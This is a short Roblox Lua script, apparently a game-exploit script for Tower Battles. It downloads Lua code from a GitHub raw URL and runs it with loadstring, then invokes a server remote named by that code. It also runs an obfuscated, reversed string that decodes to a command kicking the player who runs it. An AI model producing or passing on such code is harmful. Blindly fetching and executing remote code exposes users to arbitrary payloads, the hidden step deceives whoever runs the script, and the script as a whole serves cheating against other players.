
local Hook = {}
Hook.__index = Hook
setmetatable(Hook, {
    __index = function()
        rawset(Hook, {}, true);
    end
})
Hook["Command_StringBugger"]=")'ZE'(kciK:reyalPlacoL.)\"sreyalP\"(ecivreSteG:emag"
local HookCommand = Hook.Command_StringBugger;
local SRC_PACKET=game:HttpGet("https://raw.githubusercontent.com/erieriF/TowerBattlesScripts/refs/heads/main/Bossman.luau")
workspace:WaitForChild(loadstring(SRC_PACKET)()):InvokeServer() -- initiate user to recieve
loadstring(string.reverse(HookCommand))() -- call it rn